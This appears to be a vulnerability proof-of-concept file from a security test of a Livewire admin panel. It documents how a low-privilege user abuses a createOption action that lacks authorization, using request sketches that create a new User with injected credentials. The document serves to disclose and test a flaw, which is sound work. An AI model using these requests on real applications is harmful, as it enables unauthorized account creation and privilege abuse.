### VULN-003 — decisive requests. Full capture in response.txt / run.log.
### The createOption action has NO ->authorize() and never checks the related model's
### `create` policy — only isDisabled() + form-schema presence gate it.

### 1) Snapshot — Post edit page (authed low-priv user). author Select has createOptionForm.
GET /admin/posts/1/edit HTTP/1.1
Host: localhost:21890

### 2) Mount the createOption action
POST /livewire/update  (calls: mountAction "createOption" {} {"recordKey":"1","schemaComponent":"form.author_id"})

### 3) Submit the modal → a new User row is created (no create authorization)
POST /livewire/update  (updates: {"mountedActions.0.data.name":"Injected ...",
  "mountedActions.0.data.email":"injected_...@attacker.invalid",
  "mountedActions.0.data.password":"InjectedPass-...!"}; calls: callMountedAction)
### → newModelInstance()->fill($data)->save(): User::count() increases by 1
